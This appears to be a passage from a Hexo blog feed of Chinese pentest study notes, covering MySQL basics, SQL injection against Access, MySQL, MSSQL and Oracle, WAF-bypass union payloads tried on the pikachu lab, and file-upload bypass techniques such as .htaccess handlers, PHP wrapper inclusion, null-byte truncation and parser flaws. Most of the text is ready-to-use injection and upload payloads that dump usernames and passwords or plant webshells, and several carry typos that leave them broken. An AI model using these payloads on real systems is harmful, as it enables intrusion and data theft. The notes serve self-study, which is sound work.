      <link href="/2022/07/04/%E4%BB%8E%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AD%A6%E4%B9%A0sql%E6%B3%A8%E5%85%A5/"/>
      <url>/2022/07/04/%E4%BB%8E%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AD%A6%E4%B9%A0sql%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<hr><span id="more"></span><h1 id="mysql数据库的一些配置"><a href="#mysql数据库的一些配置" class="headerlink" title="mysql数据库的一些配置"></a>mysql数据库的一些配置</h1><p>查看mysql自动生成密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep &#x27;password&#x27; /var/log/mysqld.log  </span><br></pre></td></tr></table></figure><p>修改mysql密码策略</p><p>临时有效</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">修改策略为0</span><br><span class="line"></span><br><span class="line">set global validate_password_policy=0;</span><br><span class="line"></span><br><span class="line">修改密码长度</span><br><span class="line"></span><br><span class="line">set global validate_password_length=1;</span><br></pre></td></tr></table></figure><p>永久生效</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/my.cnf</span><br><span class="line">[mysqld]</span><br><span class="line">validate_password_policy=0</span><br><span class="line">validate_password_length=1</span><br></pre></td></tr></table></figure><h1 id="mysql数据库"><a href="#mysql数据库" class="headerlink" title="mysql数据库"></a>mysql数据库</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line">#登录mysql</span><br><span class="line"></span><br><span class="line">mysql -u root -p</span><br><span class="line"></span><br><span class="line">#查看所有数据库</span><br><span class="line"></span><br><span class="line">show databases;</span><br><span class="line"></span><br><span class="line">#创建数据库 默认编码为 utf8</span><br><span class="line"></span><br><span class="line">create database % default charset=utf8;</span><br><span class="line"></span><br><span class="line">#进入数据库</span><br><span class="line"></span><br><span class="line">use %;</span><br><span class="line"></span><br><span class="line">#查看所在数据库</span><br><span class="line"></span><br><span class="line">select database();</span><br><span class="line"></span><br><span class="line">#创建数据表t1</span><br><span class="line"></span><br><span class="line">create table t1(id int,user char(5)) default charset=utf8;</span><br><span class="line"></span><br><span class="line">#查看表</span><br><span class="line"></span><br><span class="line">show tables;</span><br><span class="line"></span><br><span class="line">#查看表内字段</span><br><span class="line"></span><br><span class="line">desc 表名;</span><br><span class="line"></span><br><span class="line">#单条添加数据</span><br><span class="line"></span><br><span class="line">insert into t1 (id,user) values (1,&#x27;tom&#x27;),(2,&#x27;jerry&#x27;);</span><br><span class="line"></span><br><span class="line">#查询表内数据</span><br><span class="line">select * from t1;</span><br><span class="line"></span><br><span class="line">#修改uid=2的数据</span><br><span class="line">updata stu set uname=&#x27;max&#x27; where uid=2;</span><br><span class="line"></span><br><span class="line">#删除数据</span><br><span class="line">delete from 表名 where 条件;</span><br><span class="line"></span><br><span class="line">#删除指定表</span><br><span class="line">drop table 表名;</span><br><span class="line"></span><br><span class="line">#删除指定数据库</span><br><span class="line">drop database 库名;</span><br><span class="line"></span><br><span class="line">#数据类型</span><br><span class="line">#变长字符varchar()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#字段约束</span><br><span class="line"></span><br><span class="line">#无符号 unsigned  </span><br><span class="line">#字节宽度 int(4)</span><br><span class="line">#前导零填充 zerofill</span><br><span class="line">#主关键字 prinmary key </span><br><span class="line">#自增 auto_increment</span><br><span class="line">#默认值 default</span><br><span class="line">#多选一 enum</span><br><span class="line">#多选多 set</span><br><span class="line"></span><br><span class="line">#查询语句</span><br><span class="line">#条件查询where</span><br><span class="line">select *from t1;</span><br><span class="line">select  uname from t1;</span><br><span class="line">select concat(uname,age,sex) from t1;</span><br><span class="line">select *from stu where uid not in (1,2,18);</span><br><span class="line">select classid ,count(*)from stu group by classid;</span><br><span class="line">select classid,count(*) from stu group by classid having count(*)&gt;20;</span><br><span class="line"></span><br><span class="line">select *from t1 where uname like &#x27;谢%&#x27;;</span><br><span class="line">select *from t1 where uname like &#x27;%剑%&#x27;;</span><br><span class="line">select *from t1 where uname like &#x27;%__%&#x27;;</span><br><span class="line">select *from t1 where (age&gt;20 and age&lt;30) and sex=&#x27;女&#x27;;</span><br><span class="line"></span><br><span class="line">#子查询</span><br><span class="line">select * from stu where age=(select max(age)from stu);</span><br></pre></td></tr></table></figure><h1 id="sql注入常用函数"><a href="#sql注入常用函数" class="headerlink" title="sql注入常用函数"></a>sql注入常用函数</h1><p>version () 数据库版本</p><p>database() 数据库名</p><p>user() 用户名</p><p>current_user() 当前用户名</p><p>system_user() 系统用户名</p><p>@@datadir 数据库路径</p><p>@@version_compile_os 操作系统</p><p>@@version 数据库版本</p><h1 id="sql语句写shell"><a href="#sql语句写shell" class="headerlink" title="sql语句写shell"></a>sql语句写shell</h1><p>数据库</p><p>select 1,load_file(‘C:&#x2F;2.txt’)     #读取文件</p><p>select ‘ ‘ into outfile ‘ ‘</p><p>select ‘ ‘ into dumpfile ‘ ‘</p><p>ceil( ) 向上取整</p><p>floor( ) 向下取整</p>]]></content>
      
      
      
        <tags>
            
            <tag> sql注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>打狗棍法</title>
      <link href="/2022/05/06/%E6%89%93%E7%8B%97%E6%A3%8D%E6%B3%95/"/>
      <url>/2022/05/06/%E6%89%93%E7%8B%97%E6%A3%8D%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h1 id="以下内容测试为pikachu靶场"><a href="#以下内容测试为pikachu靶场" class="headerlink" title="以下内容测试为pikachu靶场"></a><strong>以下内容测试为pikachu靶场</strong></h1><p>kobe%27++union&#x2F;<em>!90000aaa</em>&#x2F;+&#x2F;<em>!90000aaa</em>&#x2F;%23%0aselect+&#x2F;<em>!90000aaa</em>&#x2F;&#x2F;<em>!90000aaa</em>&#x2F;1%2C 2 %23</p><p>kobe%27+order++%2F<em>90000aaa</em>%2F%2F*%2190000aaa*%2F%2F*%2190000aaa*%2F+%23%0aby+%2F*%2190000aaa*%2F1%23</p><p>kobe%27++union&#x2F;<em>!90000aaa</em>&#x2F;+&#x2F;<em>!90000aaa</em>&#x2F;%23%0aselect+&#x2F;<em>!90000aaa</em>&#x2F;&#x2F;<em>!90000aaa</em>&#x2F;1%2C    database(&#x2F;<em>%!a</em>&#x2F;)</p><p>kobe%27++union&#x2F;<em>!90000aaa</em>&#x2F;+&#x2F;<em>!90000aaa</em>&#x2F;%23%0aselect+&#x2F;<em>!90000aaa</em>&#x2F;&#x2F;<em>!90000aaa</em>&#x2F;1%2C    group_concat(column_name) from information_schema.columns where table_name&#x3D;’users’</p><p>kobe%27++union&#x2F;<em>!90000aaa</em>&#x2F;+&#x2F;<em>!90000aaa</em>&#x2F;%23%0aselect+&#x2F;<em>!90000aaa</em>&#x2F;&#x2F;<em>!90000aaa</em>&#x2F;username%2C password from (users)</p><p>后面应该还会再更新</p>]]></content>
      
      
      
        <tags>
            
            <tag> sql注入:waf绕过 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件上传</title>
      <link href="/2022/03/25/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
      <url>/2022/03/25/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
      
        <content type="html"><![CDATA[<h2 id="任意上传"><a href="#任意上传" class="headerlink" title="任意上传"></a>任意上传</h2><p>边缘资产的版本一般都很低，所有普遍存在任意上传</p><p>目标资产很安全没有子域名、没有边缘资产时，可以从旁站入手</p><p>进入网站后台后，首先从模板、模块等地方下手，最后才考虑编辑器</p><p>白名单无法直接上传解析，只能配合文件包含来使用</p><p>木马要与网站编写的脚本语言相同，aspx编写的可以支持asp的马，但是aspx的权限大一点</p><p>getshell后，若对方数据库为mssql、mysql、oracle,还可以直接对数据库文件进行操作</p><p>抓包找不到上传文件地址可以检查元素看有没有；一般会回显图片，这时可以右键查看链接获取地址</p><h2 id="轻量级检测的绕过上传"><a href="#轻量级检测的绕过上传" class="headerlink" title="轻量级检测的绕过上传"></a>轻量级检测的绕过上传</h2><p>绕过JavaScript对文件后缀的检测（抓包修改文件后缀）</p><p>绕过后端对请求包MIME类型的检测（抓包修改Content-Type字段内容）</p><p>绕过文件幻数头的检测（gif-&gt;GIF89A；jpg-&gt;JFIF；png-&gt;%PNG）</p><h2 id="黑名单上传"><a href="#黑名单上传" class="headerlink" title="黑名单上传"></a>黑名单上传</h2><h3 id="构造特殊文件名"><a href="#构造特殊文件名" class="headerlink" title="构造特殊文件名"></a>构造特殊文件名</h3><blockquote><p>基于windows系统特性：. . .（点空格点） ::$DATA （在windows里会识别成空格）大小写绕过</p><p>基于代码层面：双写绕过，特殊文件名php（.php5|.php4|.php3|.php2|.php1|.html|.htm|.phtml|.pht|.pHp|.pHp5|.pHp4|.pHp3|.pHp2|.pHp1|） asp（.asa|.cer|.cdx）</p></blockquote><h3 id="分布式配置文件"><a href="#分布式配置文件" class="headerlink" title="分布式配置文件"></a>分布式配置文件</h3><p>.htaccess（分布式配置文件），用来管理目录的。会把相应开头的文件当作相应后缀来解析（针对apache,php）内容如下：</p><blockquote><p>&lt;FilesMatch “xx”&gt; </p><p>SetHanler application&#x2F;x-httpd-php</p><p>&lt; FilesMatch &gt; </p></blockquote><p>作为局部变量作用文件成功的前提条件:<br>(httpd.exe)开启:</p><ul><li>Allow Override All</li><li>LoadModule rewrite_module modules&#x2F;mod_rewrite.so</li></ul><h2 id="白名单"><a href="#白名单" class="headerlink" title="白名单"></a>白名单</h2><p>主要利用PHP文件包含以及伪协议</p><h3 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h3><p><strong>四个函数包含函数</strong>，include、include_once、require、require_once</p><p><strong>两个文件读取函数</strong>，fopen、file_get_contents</p><p>include()当使用该函数包含文件时，只有代码执行到include()函数时才将文件包含进来，发生错误时只给出一个警告，继续向下执行<br>include_once()功能和include()相同，区别在于当重复调用同一文件时，程序只调用一次<br>require()只要程序一执行就会立即调用文件,发生错误的时候会输出错误信息，并且终止脚本的运行<br>require_once()它的功能与require()相同，区别在于当重复调用同一文件时，程序只调用一次</p><p>fopen与file_get_contents都只能读取文件，并不能执行</p><p><strong>tips:</strong></p><ul><li>利用文件包含还可以读取网站源码及配置文件和其他东西</li><li>包含日志文件GetShell</li><li>包含session文件GetShell</li></ul><h4 id="本地包含、远程包含"><a href="#本地包含、远程包含" class="headerlink" title="本地包含、远程包含"></a>本地包含、远程包含</h4><p>当被包含的文件在服务器本地时，就形成的本地文件包含漏洞。本地包含对目标环境配置没有任何要求</p><p>远程包含形成原因与本地包含形成原因一致，当目标php.ini 配置中 allow_url_fopen&#x3D;on，allow_url_include&#x3D;on 时，包含的文件就可以是其他服务器上的文件</p><blockquote><p>index.php?file&#x3D;<a href="https://baidu.com/index.php">https://baidu.com/index.php</a></p></blockquote><h3 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h3><p><strong>tips:</strong></p><ul><li>Base64编码后不要有+号，会被url解码为空格</li></ul><h4 id="file-x2F-x2F"><a href="#file-x2F-x2F" class="headerlink" title="file:&#x2F;&#x2F;"></a>file:&#x2F;&#x2F;</h4><p>用于访问本地文件系统，并且不受allow_url_fopen，allow_url_include影响</p><blockquote><p>?file&#x3D;file:&#x2F;&#x2F;文件绝对路径</p></blockquote><h4 id="php-x2F-x2F-input"><a href="#php-x2F-x2F-input" class="headerlink" title="php:&#x2F;&#x2F;input"></a>php:&#x2F;&#x2F;input</h4><p>需要allow_url_include&#x3D;on，可以写文件，理论上可以执行任何php代码，写入内容需要用post方式提交</p><h4 id="php-x2F-x2F-filter"><a href="#php-x2F-x2F-filter" class="headerlink" title="php:&#x2F;&#x2F;filter"></a>php:&#x2F;&#x2F;filter</h4><p>只是读取，将文件中的数据进行base64加密之后再输出。所以只需要allow_url_fopen&#x3D;on</p><blockquote><p>index.php?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;head.php</p></blockquote><h4 id="data-text-x2F-plain"><a href="#data-text-x2F-plain" class="headerlink" title="data:text&#x2F;plain"></a>data:text&#x2F;plain</h4><p>需要allow_url_fopen&#x3D;on，allow_url_include&#x3D;on </p><blockquote><p>?file&#x3D;data:text&#x2F;plain,&lt;?php phpinfo();?&gt;</p><p>?file&#x3D;data:text&#x2F;plain;base64,PD9waHAgIHBocGluZm8oKTsgPz4&#x3D;</p></blockquote><h4 id="zip-x2F-x2F"><a href="#zip-x2F-x2F" class="headerlink" title="zip:&#x2F;&#x2F;"></a>zip:&#x2F;&#x2F;</h4><p>该协议需要将#编译为%23，所以需要PHP 的版本&gt; &#x3D;5.3.0，要是因为版本的问题无法将#编码成%23，可以手动把#改成%23</p><blockquote><p>file&#x3D;zip:&#x2F;&#x2F;文件路径(绝对路径相对路径都可以)压缩文件名%23压缩文件内的文件名</p></blockquote><h2 id="00截断"><a href="#00截断" class="headerlink" title="00截断"></a>00截断</h2><p>%00截断，php版本应小于5.3.4(机器码00为停止)</p><p>GET传参时，直接在url添加%00即可；若为POST传参，则需要抓包通过十六进制在相应位置填充00</p><h2 id="条件竞争"><a href="#条件竞争" class="headerlink" title="条件竞争"></a>条件竞争</h2><p>形成原因，服务端对上传的文件先保存再校验是否合法。只要我们访问的速度比删除的速度快就可以成功的访问到该文件</p><h2 id="解析漏洞"><a href="#解析漏洞" class="headerlink" title="解析漏洞"></a>解析漏洞</h2><h3 id="IIS6-0解析漏洞"><a href="#IIS6-0解析漏洞" class="headerlink" title="IIS6.0解析漏洞"></a>IIS6.0解析漏洞</h3><h4 id="目录解析"><a href="#目录解析" class="headerlink" title="目录解析"></a>目录解析</h4><p>若目录为为”xxx.asp”，那么该目录下的所有文件都将被作为asp文件解析</p><p>上传时抓包改文件上传的目录，改为能解析的目录名</p><h4 id="文件名解析"><a href="#文件名解析" class="headerlink" title="文件名解析"></a>文件名解析</h4><p>.asp;.jpg像这种畸形文件名在“；”后面的直接被忽略，也就是说当成.asp文件执行</p><h3 id="IIS7-0-x2F-7-5解析漏洞、Nginx-lt-8-03"><a href="#IIS7-0-x2F-7-5解析漏洞、Nginx-lt-8-03" class="headerlink" title="IIS7.0&#x2F;7.5解析漏洞、Nginx&lt;8.03"></a>IIS7.0&#x2F;7.5解析漏洞、Nginx&lt;8.03</h3><p>正常上传文件，访问时在后面加上 &#x2F;.php，该文件会当成PHP来解析。需要php配置文件选项<strong>cgi.fix_pathinfo&#x3D;1</strong>开启。（在严格意义上，这个属于PHP的CGI漏洞）</p><h3 id="Apache解析漏洞"><a href="#Apache解析漏洞" class="headerlink" title="Apache解析漏洞"></a>Apache解析漏洞</h3><p>Apache遇到未知文件拓展名时，会继续左移识别。</p><h2 id="IIS-PUT"><a href="#IIS-PUT" class="headerlink" title="IIS PUT"></a>IIS PUT</h2><p>IIS建设中的网站也可以利用，这些服务器可能并非为搭建网站作用（网站要有写入权限以及允许webDAV服务拓展）</p><p>请求方法put：将数据发送到服务器以创建或更新资源，存在则更改，不存在则创建</p><p>使用工具桂林老兵上传文本格式的木马，通过move方式修改文件后缀名来解析</p><h2 id="利用CMS功能上传"><a href="#利用CMS功能上传" class="headerlink" title="利用CMS功能上传"></a>利用CMS功能上传</h2><p>有些cms会有单独的编辑器后台，个别在编辑处查看源码可以显示后台地址，ewebeditor编辑器，账号密码默认为admin admin，若修改后，可到目录&#x2F;db&#x2F;直接下载数据库查看</p><p>通过后台可写入处写入木马，再用cms的木马扫描，再替换内容</p><h2 id="未授权上传"><a href="#未授权上传" class="headerlink" title="未授权上传"></a>未授权上传</h2><p>在本地构建一个html的包，可以直接上传文件（多见于bc）</p><h2 id="绕waf上传"><a href="#绕waf上传" class="headerlink" title="绕waf上传"></a>绕waf上传</h2><p>Content—Disposition后添加垃圾字符（或其他地方），删除filename最后的引号，内容换行，双写filename&#x3D;</p><p>若上传成功，但无法链接木马，可以用base64加密内容，并在蚁剑上创建编辑器并更换agent头连接</p>]]></content>
      
      
      
        <tags>
            
            <tag> 文件上传 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sql注入</title>
      <link href="/2022/03/24/SQL%E6%B3%A8%E5%85%A5/"/>
      <url>/2022/03/24/SQL%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h1 id="access联合查询"><a href="#access联合查询" class="headerlink" title="access联合查询"></a>access联合查询</h1><p>asp一般搭配access、aspx一般搭配mssql、php一般搭配mysql</p><p>access只有一个数据库，不用爆库名</p><p>order by (&#x3D;&#x3D;-&#x3D;&#x3D;) 猜字段数</p><p>union select ……,&#x3D;&#x3D;爆信息&#x3D;&#x3D;,…… from （&#x3D;&#x3D;要查的表名&#x3D;&#x3D;）</p><p>可以通过后台登陆页面的源代码查看账号以及密码的可能的字段名</p><h1 id="access盲注"><a href="#access盲注" class="headerlink" title="access盲注"></a>access盲注</h1><p>&#x3D;&#x3D;（select count（*）from msysobjects)&gt;0&#x3D;&#x3D;</p><p>msysobjects access的专属表名，在web中访问没有权限，会报错。如果没报错说明数据库是mssql的</p><p>&lt;&gt;(select coount(*)from &#x3D;&#x3D;要猜的表名&#x3D;&#x3D;)</p><p>通过回显判断要查询的表名是否存在</p><p>(select count(*)from &#x3D;&#x3D;要猜的表名&#x3D;&#x3D;)&#x3D; &#x3D;&#x3D;-&#x3D;&#x3D;</p><p>判断表内数据有几行</p><p>1&#x3D;(select count(*)from &#x3D;&#x3D;表名&#x3D;&#x3D; where len (&#x3D;&#x3D;字段名&#x3D;&#x3D;)&gt;0)</p><p>判断字段名是否存在</p><p>(select top 1 asc(mid(&#x3D;&#x3D;字段名&#x3D;&#x3D; 1,1))from &#x3D;&#x3D;表名&#x3D;&#x3D;)&#x3D; &#x3D;&#x3D;-&#x3D;&#x3D;</p><p>判断top 1(第一行),截取第一个数据的ASCII码是多少</p><h1 id="mysql联合查询"><a href="#mysql联合查询" class="headerlink" title="mysql联合查询"></a>mysql联合查询</h1><p>字符型要闭合单引号，有魔术引号就转码</p><p>order by &#x3D;&#x3D;*&#x3D;&#x3D;猜字段数</p><p>union select …,&#x3D;&#x3D;爆信息&#x3D;&#x3D;,…    #user() 爆权限；#database() 爆当前数据库名；#version() 爆数据库版本</p><p>union select …,group_concat(table_name),… from information_schema.tables where table_schema&#x3D; ‘&#x3D;&#x3D;数据库名&#x3D;&#x3D;’  #爆表名 </p><p>union select …,group_concat(column_name),… from information_schema.columns where table_name&#x3D; ‘&#x3D;&#x3D;列名&#x3D;&#x3D;’  #爆列名</p><p>union select ……,&#x3D;&#x3D;爆内容&#x3D;&#x3D;,…… from （&#x3D;&#x3D;查出的列名&#x3D;&#x3D;）</p><p>##查询其他数据库的数据</p><p>union select …,group_concat(schema_name),… from information_schema.schemata  查数据库 </p><p>union select …,group_concat(&#x3D;&#x3D;字段内容&#x3D;&#x3D;),… from &#x3D;&#x3D;库名&#x3D;&#x3D;.&#x3D;&#x3D;表名&#x3D;&#x3D;查字段内容</p><h1 id="mysql-cookie注入"><a href="#mysql-cookie注入" class="headerlink" title="mysql-cookie注入"></a>mysql-cookie注入</h1><p>and 1&#x3D;2 是为了让前面的查询为空，这样才能显示后面的数据</p><h1 id="mysql盲注"><a href="#mysql盲注" class="headerlink" title="mysql盲注"></a>mysql盲注</h1><p>length、substr、ascii能在括号内也能在括号外使用</p><p>常用函数 exists() ascii() substr() ord() mid() length() left() regexp()</p><p>使用例子 substr(‘root’,1,3)</p><p>mid(‘root’,1,3)</p><p>mid 和 substr 是一样的</p><p>ord 和 ascii 是一样的</p><p>and (select length(user) from users limit 0,1)&gt;0 &#x3D;  and length((select user from users limit 0,1))&gt;0</p><p>1’ and (select ascii(substr(table_name,1,1)) from information_schema.tables where table_schema&#x3D;’dvwa’ limit 0,1)&gt;0#</p><p>and database()&#x3D;’dvwa’#</p><p>and length(database())&#x3D; &#x3D;&#x3D;4&#x3D;&#x3D;#  爆数据库长度</p><p>and ascii(substr(database(),&#x3D;&#x3D;4&#x3D;&#x3D;,1))&#x3D;’&#x3D;&#x3D;97&#x3D;&#x3D;’ #  逐字爆库</p><p>and ( select count(table_name) from information_schema.tables where table_schema&#x3D;’dvwa’)&#x3D; &#x3D;&#x3D;2&#x3D;&#x3D;#  判断数据库内有多少个表 这里可以用*代替table_name</p><p> and length((select table_name from information_schema.tables where table_schema&#x3D;’dvwa’ limit &#x3D;&#x3D;0&#x3D;&#x3D;,1))&gt; &#x3D;&#x3D;0&#x3D;&#x3D;#  爆表名长度</p><p> and ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;’dvwa’ limit 0,1),2,1))&gt;0#  逐字报表</p><p>and (select count(columns_name) from information_schema.columns where table_name&#x3D;’users’)&#x3D;15# 判断表内有多少列</p><p>and length((select column_name from information_schema.columns where table_name&#x3D;’users’ limit 0,1))&gt;0# 判断列名长度</p><p>and ascii(substr((select column_name from information_schema.columns where table_name&#x3D;’users’ limit 0,1),1,1))&gt;0# 逐字爆列</p><p>and (select count(&#x3D;&#x3D;user&#x3D;&#x3D;) from &#x3D;&#x3D;users&#x3D;&#x3D;)&gt;0#  猜字段内有多少数据</p><p>and (select length(&#x3D;&#x3D;user&#x3D;&#x3D;) from &#x3D;&#x3D;users&#x3D;&#x3D; limit 0,1)&gt;0# 猜数据长度</p><p>and ascii(substr((select user from users limit 0,1),1,1))&gt;0# 逐字爆数据内容</p><h1 id="延时注入-宽字节注入"><a href="#延时注入-宽字节注入" class="headerlink" title="延时注入+宽字节注入"></a>延时注入+宽字节注入</h1><p>延时注入跟布尔差不多，就多了sleep（）</p><p>宽字节注入加入宽字节就行</p><p>%df</p><h1 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h1><p>这三个函数都能使用</p><p>select extractvalue(1,concat(‘<del>‘,(select database()),’</del>‘))</p><p>select updatexml(1,concat(‘~’,(select database())),1)</p><p>select count(*),concat((select database()),0x7e,floor(rand(0)*2))x from information_schema.tables group by x</p><h1 id="x-forwarded-for头注入"><a href="#x-forwarded-for头注入" class="headerlink" title="x-forwarded-for头注入"></a>x-forwarded-for头注入</h1><p>127.0.0.1’, updataxml (1,concat(0x7e, (select user() ),0x7e ),1 ) #  爆用户权限</p><p>127.0.0.1’, updataxml (1, concat (0x7e,(select database() ) , 0x7e ) ,1) #  爆数据库</p><p>127.0.0.1’, and updataxml (1,concat(0x7e,(select table_name from information_schema.tables where table_schema&#x3D; &#x3D;&#x3D;database()&#x3D;&#x3D; limit 0,1), 0x7e),1)#  获取第一个表名</p><p>127.0.0.1’, and updataxml (1,concat(0x7e,(select column_name from information_schema.columns where table_schema&#x3D; &#x3D;&#x3D;database()&#x3D;&#x3D; and  table_name&#x3D; &#x3D;&#x3D;’users’&#x3D;&#x3D; limit 0,1), 0x7e),1)#  获取第一个字段名</p><p>127.0.0.1’, updataxml (1,concat(0x7e, (select concat (username, password) from user limit 0,1), 0x7e ), 1 ) #  爆字段内容</p><h1 id="mssql注入"><a href="#mssql注入" class="headerlink" title="mssql注入"></a>mssql注入</h1><p>order by &#x3D;&#x3D;4&#x3D;&#x3D;</p><p>and 1&#x3D;2 union all select null,’null’,null,null</p><p>and 1&#x3D;2 union all select null,’2’,’3’,null</p><p>加all能显示重复内容，mssql的字段分数据类型，所以要用单引号判断显示位</p><p>and 1&#x3D;2 union all select null,(select db_name()),null,null  爆数据库名</p><p>and 1&#x3D;2 union all select null,(select @@version),null,null  爆数据库版本</p><p> and 1&#x3D;2 union all select null,(select top 1 from &#x3D;&#x3D;数据库名&#x3D;&#x3D;.dbo.sysobjects where xtype&#x3D;’u’),null,null</p><p>爆表名，mssql没有limit，用top1表示第一个（不懂为什么要加top1???)， sysobjects类似于mysql里的information_schema，xtype&#x3D;’s’是系统自带的表，一般查询xtype&#x3D;’u’这是用户创建的表，dbo应该是表示获取路径是数据库吧</p><p> and 1&#x3D;2 union all select null,(select top 1 col_name(objects_id(‘&#x3D;&#x3D;表名&#x3D;&#x3D;’),&#x3D;&#x3D;3&#x3D;&#x3D;)from sysobjects),null,null</p><p>爆列名，objects_id每一个字段该值是唯一的，并且该值只对应用户创建的表，不对应系统创建的, 该函数会返回指定对象的id值</p><p>大家都知道在数据库中有一个系统表sysobjects，里面存储了数据库各个对象的信息。可以查询下看看结果。可以看出每个对象都有一个ID，这个表存储了表，存储过程，触发器，视图等相关信息。注意：字段没有。</p><p> object_id就是根据对象名称返回该对象的id.<br> object_name是根据对象id返回对象名称.<br> select object_id(对象名)等同于:<br> select id from sysobjects where name&#x3D;对象名。                                       select object_name(id号)等同于:<br> select name from sysobjects where id&#x3D;id号</p><p>and 1&#x3D;2 union all select null,(select top 1 &#x3D;&#x3D;username&#x3D;&#x3D; from &#x3D;&#x3D;列名&#x3D;&#x3D;),null,null</p><p>爆字段</p><h1 id="oracle注入"><a href="#oracle注入" class="headerlink" title="oracle注入"></a>oracle注入</h1><p>oracle最高权限DBA</p><p>管理员用户system </p><p>order by&#x3D;&#x3D;2&#x3D;&#x3D;</p><p>爆字段</p><p>and 1&#x3D;2 union select null,’null’ from dual</p><p>and 1&#x3D;2 union select null,’&#x3D;&#x3D;2&#x3D;&#x3D;’ from &#x3D;&#x3D;dual&#x3D;&#x3D;</p><p>跟mssql一样，字段都分数据类型，oracle查询要跟表名，dual是oracle中附带的一张虚拟表</p><p>and 1&#x3D;2 union select null,(select sys_context(‘userenv’,’current_user’)from dual) from dual</p><p>爆数据库当前用户</p><p>and 1&#x3D;2 union select null,(select instance_name from V$INSTANCE) from dual</p><p>爆数据库名</p><p>and 1&#x3D;2 union select null,(select banner from sys.v_$version where rownum&#x3D;1) from dual</p><p>爆数据库版本，因为每次只能回显一条数据，所以要加where rownum&#x3D;1</p><p>and 1&#x3D;2 union select null,(select table_name where rownum&#x3D;1 and &#x3D;&#x3D;table_name like ‘%user%’&#x3D;&#x3D;) from dual</p><p>爆表名，table_name like ‘%user%’相当于检索于users有关的表</p><p>and 1&#x3D;2 union select null,(select column_name from user_tab_name where table_name&#x3D;’&#x3D;&#x3D;user&#x3D;&#x3D;’ and rounum&#x3D;1) from dual</p><p>and 1&#x3D;2 union select null,(select column_name from user_tab_name where table_name&#x3D;’&#x3D;&#x3D;user&#x3D;&#x3D;’ and rounum&#x3D;1 and column_name not in(‘&#x3D;&#x3D;username&#x3D;&#x3D;’)) from dual</p><p>爆列名，column_name not in(‘&#x3D;&#x3D;username&#x3D;&#x3D;’)为排除查询过的列名</p><p>and 1&#x3D;2 union select username,password from “users” &#x3D;&#x3D;where user &lt;&gt; ‘admin’&#x3D;&#x3D;</p><p>爆字段， where user &lt;&gt; ‘admin’ ，为排除已查询的信息&lt;&gt;是不等于</p><h1 id="waf绕过"><a href="#waf绕过" class="headerlink" title="waf绕过"></a>waf绕过</h1><p>所有waf思路都差不多，内联注释加编码换行这是常用的，另外还有替换常用函数等方法，这个后面有时间会更新</p>]]></content>
      
      
      
        <tags>
            
            <tag> sql注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>信息收集</title>
      <link href="/2022/02/27/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
      <url>/2022/02/27/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
      
